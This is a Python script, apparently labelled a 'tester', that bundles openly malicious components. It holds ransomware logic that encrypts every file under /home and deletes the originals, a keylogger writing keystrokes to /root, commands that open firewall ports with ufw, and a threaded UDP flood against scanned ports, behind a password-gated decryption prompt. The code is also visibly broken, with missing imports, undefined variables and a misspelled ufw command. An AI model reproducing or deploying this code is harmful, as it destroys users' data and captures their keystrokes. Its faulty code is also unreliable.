import platform
if platform.system() != "Linux":
    sys.stdout.write(f"\n[!] Can't Running Platform : [{platform.system()}]\n")
    sys.exit()

from cryptography.fernet import Fernet
from urllib.parse import urlparse
import hashlib,pathlib,base64,sys,os,random,threading as th,keyboard

file_path = "/home"

def file_find(file_path,path_list=[],file_name="target_file_path_list.txt"):
    if os.path.isdir(file_path) == True:
        for path in pathlib.Path(file_path).glob("*"):
            file_find(f"{path}")
    else:
        path_list.append(f"{file_path}")
    return path_list

class Malware_tester:
    def __init__(self,password):
        self.file_path = "/home"
        self.password_data = password
        self.mesg_txt = "/root/Welcome_Friend.alecto"

    def key_base(self):
        return base64.b64encode((hashlib.md5(self.password_data.encode()).hexdigest()).encode())

    def file_encrypt(self,path_list):
        key = Fernet(self.key_base())
        for file_path in path_list:
            encrypt_word = key.encrypt((open(file_path,"r").read()).encode())
            with open(f"{file_path}.alecto","wb+")as file_encrypt:
                file_encrypt.write(encrypt_word)
            os.remove(file_path)

    def file_decrypt(self,file_path):
        key = Fernet(self.key_base())
        for file_path in path_list:
            decrypt_word = key.decrypt(open(file_path,"rb").read()).decode()
            path_name,file_name = os.path.dirname(file_path),os.path.basename(file_path).strip(".alecto")
            with open(f"{path_name}{file_name}","w+")as file_decrypt:
                file_decrypt.write(decrypt_word)
            os.remove(file_path)

    def message_text(self):
        with open(self.mesg_txt,"w+",encoding="utf-8")as file_mesg:
            message_data = "Test_Rootkit"
            file_mesg.write(message_data)

class Dos_Attack:
    def __init__(self):
        self.target_url = "http://127.0.0.1"
        self.domain = urlparse(self.target_url).netloc
        self.port_list = [22,25,53,80]
        self.send_base = 100

    def port_scan_tester(self,list_data=[]):
        for port in self.port_list:
            with socket.socket(socket.AF_INET,socket.SOCK_STREAM)as sock:
                if sock.connect_ex((self.domain,port)) == 0:
                    port_list.append(port)
        return list_data

    def dos_attack(self,port):
        while True:
            with socket.socket(socket.AF_INET,socket.SOCK_DGRAM)as sock:
                sock.connect((self.domain,port))
                sock.send(100 ** 3)

    def main_attack(self):
        for port in self.port_scan_tester:
            if port == None:
               port = 80

            th.Thread(target=self.dos_attack,args=(port,)).start()

class KeyLogger_Tester:
    def __init__(self):
        self.keep_file_path = "/root/RootKit_Tester_Key_Logger.alecto"

    def keylogger(self):
        while True:
            with open(self.keep_file_path,"a+",encoding="utf-8")as file_data:
                file_data.write(f"{keyboard.read_key()}\n")

class Back_Door_Tester:
    def __init__(self):
        self.port_list = ["21","22","25","80"]

    def fire_wall_disnble(self):
        disnble_base = subprocess.call(["ufw","disnble"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
    
    def port_open(self):
        for port in self.port_list:
            port_open = subprocess.call(["ufw","allow",port],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)

    
def main(password="hello_friend",target_path=file_find(file_path)):
    malware_tester,dos_attack,keylogger,back_door_tester = Malware_tester(password),Dos_Attack(),KeyLogger_Tester(),Back_Door_Tester()
    malware_tester.file_encrypt(target_path)  
    back_door_tester.port_open()
    dos_attack.main_attack()
    keylogger.keylogger()
    message_data = ""
    while True:
        try:
            sys.stdout.write(f"\n[*] {message_data}\n")
            password_data = str(input("[$] Password : "))
            if password_data == password:
                malware_tester.file_decrypt(target_path)
                sys.stdout.write("\n[*] GoodBye_Friend...\n")
                sys.exit()
        except:
           pass
    #malware_tester.message_text()
    #file_encrypt(file_find())
    #file_decrypt(file_find())

if __name__ == "__main__":
   main() 
